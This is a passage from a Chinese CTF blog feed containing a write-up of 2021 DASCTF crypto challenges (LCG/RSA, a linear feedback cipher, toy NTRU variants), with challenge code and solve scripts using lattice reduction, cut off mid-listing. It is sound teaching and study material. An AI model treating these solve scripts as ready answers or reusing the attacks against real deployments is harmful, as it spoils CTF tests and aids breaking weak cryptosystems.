n)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    M[i,i] = q</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    M[i+n,i+n] = <span class="number">1</span></span><br><span class="line">    c = convolution(x^i,publickeyover3)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      M[i+n,j] = c[j]</span><br><span class="line">  M = M.LLL()</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> * n):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      f = Zx(<span class="built_in">list</span>(M[j][n:]))</span><br><span class="line">      f3 = invertmodprime(f,<span class="number">3</span>)</span><br><span class="line">      <span class="keyword">return</span> (f,f3)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">return</span> (f,f)</span><br><span class="line"></span><br><span class="line">n = <span class="number">120</span></span><br><span class="line">q = <span class="number">2</span>^<span class="number">32</span></span><br><span class="line">d = <span class="number">81</span></span><br><span class="line"></span><br><span class="line">publickey,secretkey = keypair()</span><br><span class="line">donald = attack(publickey)</span><br><span class="line"><span class="built_in">print</span> donald[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  m = randommessage()</span><br><span class="line">  c = encrypt(m,publickey)</span><br><span class="line">  <span class="keyword">assert</span> decrypt(c,donald) == m</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;attack successfully decrypts&#x27;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;attack was unsuccessful&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªè„šæœ¬ç”¨çš„æ˜¯Python2çš„sage? çœŸçš„è¦ç”¨æ¥è§£é¢˜ä¼°è®¡è¿˜å¾—è‡ªå·±å†™ä¸€ä¸ª</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‰“äº†ä¸ªæ¯”èµ›NTRUä¸ä¼šåš, ç¿»å¯†ç çˆ·çˆ·çš„åšå®¢å‘ç°ä¸€ä¸ªå®è—ç½‘ç«™&lt;a href=&quot;https://latticehacks.cr.yp.to/&quot;&gt;https://latticehacks.cr.yp.to&lt;/a&gt;&lt;br&gt;è™½ç„¶å†…å®¹ä¸å¤š, è¿˜æ˜¯è‹±è¯­çš„. è¿™</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021 3æœˆdsactf</title>
    <link href="http://tearsjin.github.io/2021/03/27/writeup-for-2021-3%E6%9C%88dsactf/"/>
    <id>http://tearsjin.github.io/2021/03/27/writeup-for-2021-3%E6%9C%88dsactf/</id>
    <published>2021-03-27T11:36:57.000Z</published>
    <updated>2021-03-29T16:30:42.276Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>orz è¿˜æ˜¯å¤ªèœäº†ï¼Œè¿™ä¸ªæ¯”èµ›å¯†ç éƒ½è¢«Aç©¿äº†ï¼Œæˆ‘è¿˜æ˜¯åšä¸å‡ºNTRUï¼Œå¸ˆå‚…ä»¬éƒ½è¯´ç®€å•ï¼Œå¤šé¡¹å¼æ€æˆ‘<br>è¿˜æ˜¯è¯¦ç»†è®°å½•ä¸€ä¸‹å§ï¼ŒåŠ æ²¹</p></blockquote><h1 id="0x00-crypto-threshold"><a href="#0x00-crypto-threshold" class="headerlink" title="0x00 crypto_threshold"></a>0x00 crypto_threshold</h1><blockquote><p>æ˜¯ç­¾åˆ°æ²¡é”™äº†ã€‚ã€‚ã€‚</p></blockquote><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span>(<span class="params">seed,params</span>):</span></span><br><span class="line">    (m,c,n)=params</span><br><span class="line">    s = seed % n</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = (m * s + c) % n</span><br><span class="line">        <span class="keyword">yield</span> s</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">seed = getPrime(<span class="number">128</span>)</span><br><span class="line">m = getPrime(<span class="number">128</span>)</span><br><span class="line">c = getPrime(<span class="number">128</span>)</span><br><span class="line">n = getPrime(<span class="number">129</span>)</span><br><span class="line"></span><br><span class="line">print(m,c,n)</span><br><span class="line">key_stream = lcg(seed,(m,c,n))</span><br><span class="line">num=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">num.append(<span class="built_in">next</span>(key_stream))</span><br><span class="line"></span><br><span class="line">print(num)</span><br><span class="line">secret =  <span class="built_in">next</span>(key_stream)</span><br><span class="line"></span><br><span class="line">e = nextprime(secret)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_lambda = ((p-<span class="number">1</span>)*(q-<span class="number">1</span>)) / gcd(p-<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(_lambda)</span><br><span class="line">print(p*q)</span><br><span class="line">print(<span class="built_in">pow</span>(flag,e,p*q))</span><br><span class="line">        </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># data</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>æ¡ä»¶å…¨ç»™çš„LCGï¼Œç›´æ¥å¾€ä¸‹æ¨å°±å¥½äº†ã€‚<br>$\lambda$RSA, ç›´æ¥æ±‚é€†å°±æ˜¯ç§é’¥äº†</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span>(<span class="params">seed, params</span>):</span></span><br><span class="line">    (m, c, n) = params</span><br><span class="line">    s = seed % n</span><br><span class="line">    <span class="keyword">return</span> (m * s + c) % n</span><br><span class="line"></span><br><span class="line">m, c, n = (<span class="number">315926151576125492949520250047736865439</span>, <span class="number">204423972944032372640132172728460755543</span>,</span><br><span class="line">           <span class="number">375402477603617093440157245062608289367</span>)</span><br><span class="line">seed = <span class="number">287868671713011127830359814204794790287</span></span><br><span class="line">e = nextprime(lcg(seed, (m, c, n)))</span><br><span class="line">_lambda = </span><br><span class="line">d = invert(e, lam)</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><h1 id="0x01-FeedBack"><a href="#0x01-FeedBack" class="headerlink" title="0x01 FeedBack"></a>0x01 FeedBack</h1><blockquote><p>æµå¯†ç çš„è·¯å­ï¼Œå†ç†Ÿæ‚‰ä¸è¿‡äº†</p></blockquote><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> hexdigits</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cycle</span>(<span class="params">c:<span class="built_in">list</span>,a:<span class="built_in">list</span></span>)-&gt;int:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y: x+y,<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">1</span>],<span class="built_in">zip</span>(c,a))) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">m:<span class="built_in">list</span>,k:<span class="built_in">list</span></span>)-&gt;list:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)*<span class="number">2</span>):</span><br><span class="line">        m.append(cycle(m[i:i+<span class="built_in">len</span>(k)],k))</span><br><span class="line">    <span class="keyword">return</span> m[<span class="built_in">len</span>(k):]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key=[<span class="built_in">ord</span>(random.choice(hexdigits)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line">    c=enc(<span class="built_in">list</span>(flag),key)</span><br><span class="line">    print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># data</span></span><br></pre></td></tr></table></figure><h2 id="analyses-1"><a href="#analyses-1" class="headerlink" title="analyses"></a>analyses</h2><p>ç®€å•è¯´ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹å§ï¼Œkeyå’Œflagçš„é•¿åº¦éƒ½æ˜¯27è¿™ä¸ªä»”ç»†ç‚¹çœ‹åº”è¯¥å°±å¯ä»¥çœ‹å‡ºæ¥äº†.<br>è®°$key = (k_0,k_1,\cdots,k_{26}),flag = (m_0,m_1,\cdots,m_{26})$<br>è¿™é‡Œçš„åŠ å¯†å…¶å®å°±æ˜¯è®¡ç®—$m_{n+1}$ç„¶åæ”¾åœ¨æœ€åé¢<br>$$<br>m_{n+1} =m_nk_{26} + m_{n-1}k_{25}+\cdots +m_{n-26}k_0<br>$$<br>å†æ¥çœ‹çœ‹æ¡ä»¶ï¼Œé¢˜ç›®ç»™äº†$m_{27},m_{28},\cdots,m_{80}$ä¸€å…±54ä¸ªã€‚å†™æˆçŸ©é˜µå°±çŸ¥é“è¿™54ä¸ªèƒ½å¹²ä»€ä¹ˆå¤§äº‹æƒ…äº†<br>$$<br>\begin{pmatrix}<br>m_{27}&amp;m_{28}&amp;\cdots&amp;m_{53} \\<br>m_{28}&amp;m_{29}&amp;\cdots&amp;m_{54} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>m_{53}&amp;m_{54}&amp;\cdots&amp;m_{79}<br>\end{pmatrix}<br>\begin{pmatrix}<br>k_0 \\<br>k_1 \\<br>\vdots \\<br>k_{26}<br>\end{pmatrix}<br>=<br>\begin{pmatrix}<br>m_{54} \\<br>m_{55} \\<br>\vdots \\<br>m_{80}<br>\end{pmatrix}<br>$$<br>æ‰€ä»¥è¿™54ä¸ªmå·²ç»å¯ä»¥è§£å‡ºå…¨éƒ¨çš„$key$äº†</p><p>è§£å‡º27ä¸ª$key$ä»¥åï¼Œå°±æ˜¯é¢˜ç›®æ‰€è¯´çš„<code>feedback</code>äº†ï¼Œ æˆ‘ä»¬çŸ¥é“ï¼Œå‰27ä¸ª$m$è®¡ç®—ä¸‹ä¸€ä¸ª$m$ï¼Œè€Œ$m_{53} = m_{52}k_{26}+\cdots+m_{26}k_0$, å¯ä»¥çœ‹åˆ°è¿™ä¸ªå¼å­é‡Œï¼Œ æˆ‘ä»¬åªæœ‰$m_{26}$ä¸çŸ¥é“ï¼Œç›´æ¥è§£æ–¹ç¨‹æˆ–è€…çˆ†ç ´éƒ½å¯ä»¥è§£å‡ºæ¥ã€‚è§£å‡º$m_{26}$å°±å¯ä»¥æŒ‰ç€è¿™ä¸ªæ€è·¯ä¸€è·¯å¾€å›è§£ï¼Œç›´åˆ°è§£å‡ºå…¨éƒ¨$m$ã€‚</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cycle</span>(<span class="params">c,a</span>):</span></span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y: x+y,<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">1</span>],<span class="built_in">zip</span>(c,a))) </span><br><span class="line"></span><br><span class="line">c = [...]</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    v = c[i:i+<span class="number">27</span>]</span><br><span class="line">    A.append(v)</span><br><span class="line">s = vector(c[<span class="number">27</span>:])</span><br><span class="line">A = Matrix(A)</span><br><span class="line">a = A.solve_left(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = c[:<span class="number">27</span>]</span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        res = cycle([i] + c[:-<span class="number">1</span>],a)</span><br><span class="line">        <span class="keyword">if</span> res == c[-<span class="number">1</span>]:</span><br><span class="line">            c = [i] + c[:-<span class="number">1</span>]</span><br><span class="line">            m.append(<span class="built_in">chr</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(m[::-<span class="number">1</span>])        </span><br></pre></td></tr></table></figure><h1 id="0x02-son-of-NTRU"><a href="#0x02-son-of-NTRU" class="headerlink" title="0x02 son_of_NTRU"></a>0x02 son_of_NTRU</h1><blockquote><p>åšè¿‡ä¸€æ ·çš„é¢˜äº†ï¼Œé‚£é“é¢˜è¿˜æ˜¯æˆ‘æ ¼çš„å¯è’™ï¼Œæ€ä¹ˆä¼šå¿˜å‘¢<br><a href="https://xz.aliyun.com/t/7163">https://xz.aliyun.com/t/7163</a> - ä»ä¸€é“CTFé¢˜åˆæ¢NTRUæ ¼å¯†ç </p></blockquote><h2 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/bash/env python3</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b = b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = randrange(<span class="number">1</span>,(p//<span class="number">2</span>)**(<span class="number">0.5</span>))</span><br><span class="line">        g = randrange((p//<span class="number">4</span>)**(<span class="number">0.5</span>),(p//<span class="number">2</span>)**(<span class="number">0.5</span>))</span><br><span class="line">        <span class="keyword">if</span> gcd(f,p)==<span class="number">1</span> <span class="keyword">and</span> gcd(f,g)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = (invert(f,p)*g)%p</span><br><span class="line">    <span class="keyword">return</span> h,p,f,g</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,h,p</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> m&lt;(p//<span class="number">4</span>)**(<span class="number">0.5</span>)</span><br><span class="line">    r = randrange(<span class="number">1</span>,(p//<span class="number">2</span>)**(<span class="number">0.5</span>))</span><br><span class="line">    c = (r*h+m)%p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">h,p,f,g = generate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">c = encrypt(bytes_to_long(flag),h,p)</span><br><span class="line">print(<span class="string">&quot;h = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(h))</span><br><span class="line">print(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">print(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="comment"># h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004</span></span><br><span class="line"><span class="comment"># p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469</span></span><br><span class="line"><span class="comment"># c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyses-2"><a href="#analyses-2" class="headerlink" title="analyses"></a>analyses</h2><p>ä¸å¤šè¯´äº†ï¼Œå‰é¢è¯´çš„é‚£ä¸ªblogè¯´çš„è¶…çº§æ¸…æ¥šã€‚è¿™é“é¢˜åœ¨ç”Ÿæˆå‚æ•°çš„æ—¶å€™ç»™äº†ä¸€å¤§å †æ¡ä»¶å°±æ˜¯ä¸ºäº†åœ¨æ ¼åŸºè§„çº¦çš„æ—¶å€™èƒ½å¤ŸæŠŠ$f$å’Œ$g$è§„çº¦å‡ºæ¥ã€‚è¿˜æœ‰ï¼é‚£ä¸ªåŒä½™å¼è¦å‚æ•°å¤Ÿå°æ‰èƒ½æ¨¡$g$çº¦å»éšæœºæ•°$r$ã€‚</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line">h = <span class="number">70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004</span></span><br><span class="line">p = <span class="number">125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469</span></span><br><span class="line">c = <span class="number">4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700</span></span><br><span class="line"></span><br><span class="line">v1 = vector([<span class="number">1</span>,h])</span><br><span class="line">v2 = vector([<span class="number">0</span>,p])</span><br><span class="line">f,g = Matrix([v1,v2]).LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)</span><br><span class="line">d = <span class="built_in">int</span>(inverse_mod(f,g))</span><br><span class="line">x = <span class="built_in">int</span>((c * f) % p %g )</span><br><span class="line">l2b((x * d)%g)</span><br></pre></td></tr></table></figure><h1 id="0x03-threshold"><a href="#0x03-threshold" class="headerlink" title="0x03 threshold"></a>0x03 threshold</h1><blockquote><p>çœŸæ­£çš„NTRUï¼Œæˆ‘å¤ªèœäº†ä¸çŸ¥é“å¤šé¡¹å¼è¦æ€ä¹ˆå¤„ç†ï¼Œå»dawn_wispherçˆ·çˆ·çš„Blogå­¦ä¹ ä¸€ä¸‹ï¼Œå­¦ä¼šäº†å†æ¥æ›´æ–°<br>3/29 ä¿ºå›æ¥äº†, ä¿ºå­¦ä¼šäº†, ä¸è¿‡è¿™è¾¹åªæ‰”ä¸€æ³¢è„šæœ¬, å…·ä½“åŸç†å¯ä»¥å»çœ‹æˆ‘çš„å¦å¤–ä¸€ç¯‡<a href="https://tearsjin.github.io/2021/03/28/Translation-of-LatticeHacks/">Translation of LatticeHacks</a></p></blockquote><h2 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#make.sage</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="built_in">bytearray</span>(<span class="string">&quot;DASCTF&#123;********************************&#125;&quot;</span>.encode())</span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">length = <span class="built_in">len</span>(flag)</span><br><span class="line">N=<span class="number">53</span></span><br><span class="line">p=<span class="number">257</span></span><br><span class="line">q=<span class="number">28019</span></span><br><span class="line">d=<span class="number">18</span></span><br><span class="line">f=[<span class="number">1</span>]*<span class="number">19</span>+[-<span class="number">1</span>]*<span class="number">18</span>+[<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">random.shuffle(f)</span><br><span class="line">g=[<span class="number">1</span>]*<span class="number">18</span>+[-<span class="number">1</span>]*<span class="number">18</span>+[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">random.shuffle(g)</span><br><span class="line"></span><br><span class="line">Q.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">P.&lt;y&gt; = Zmod(p)[]</span><br><span class="line">fx=Q(f)</span><br><span class="line">fy=P(f)</span><br><span class="line">gx=Q(g)</span><br><span class="line">Fqx=fx.inverse_mod(x^N-<span class="number">1</span>)</span><br><span class="line">Fpy=fy.inverse_mod(y^N-<span class="number">1</span>)</span><br><span class="line">hx=(Fqx*gx).mod(x^N-<span class="number">1</span>)</span><br><span class="line">r=[<span class="number">1</span>]*<span class="number">10</span>+[-<span class="number">1</span>]*<span class="number">22</span>+[<span class="number">0</span>]*<span class="number">21</span></span><br><span class="line">random.shuffle(r)</span><br><span class="line">rx=Q(r)</span><br><span class="line">mx=Q(flag)</span><br><span class="line">ex=(p*rx*hx+mx).mod(x^N-<span class="number">1</span>)</span><br><span class="line">print(ex)</span><br><span class="line">print(hx)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7367*x^52 + 24215*x^51 + 5438*x^50 + 7552*x^49 + 22666*x^48 + 21907*x^47 + 10572*x^46 + 19756*x^45 + 4083*x^44 + 22080*x^43 + 1757*x^42 + 5708*x^41 + 22838*x^40 + 4022*x^39 + 9239*x^38 + 1949*x^37 + 27073*x^36 + 8192*x^35 + 955*x^34 + 4373*x^33 + 17877*x^32 + 25592*x^31 + 13535*x^30 + 185*x^29 + 9471*x^28 + 9793*x^27 + 22637*x^26 + 3293*x^25 + 27047*x^24 + 21985*x^23 + 13584*x^22 + 6809*x^21 + 24770*x^20 + 16964*x^19 + 8866*x^18 + 22102*x^17 + 18006*x^16 + 3198*x^15 + 19024*x^14 + 2777*x^13 + 9252*x^12 + 9684*x^11 + 3604*x^10 + 7840*x^9 + 17573*x^8 + 11382*x^7 + 12726*x^6 + 6811*x^5 + 10104*x^4 + 7485*x^3 + 858*x^2 + 15100*x + 15860</span></span><br><span class="line"><span class="comment">#14443*x^52 + 10616*x^51 + 11177*x^50 + 24769*x^49 + 23510*x^48 + 23059*x^47 + 21848*x^46 + 24145*x^45 + 12420*x^44 + 1976*x^43 + 16947*x^42 + 7373*x^41 + 16708*x^40 + 18435*x^39 + 18561*x^38 + 21557*x^37 + 16115*x^36 + 7873*x^35 + 20005*x^34 + 11543*x^33 + 9488*x^32 + 2865*x^31 + 11797*x^30 + 2961*x^29 + 14944*x^28 + 22631*x^27 + 24061*x^26 + 9792*x^25 + 6791*x^24 + 10423*x^23 + 3534*x^22 + 26233*x^21 + 14223*x^20 + 15555*x^19 + 3381*x^18 + 23641*x^17 + 2697*x^16 + 11303*x^15 + 6030*x^14 + 7355*x^13 + 20693*x^12 + 1768*x^11 + 10059*x^10 + 27822*x^9 + 8150*x^8 + 5458*x^7 + 21270*x^6 + 22651*x^5 + 8381*x^4 + 2819*x^3 + 3987*x^2 + 8610*x + 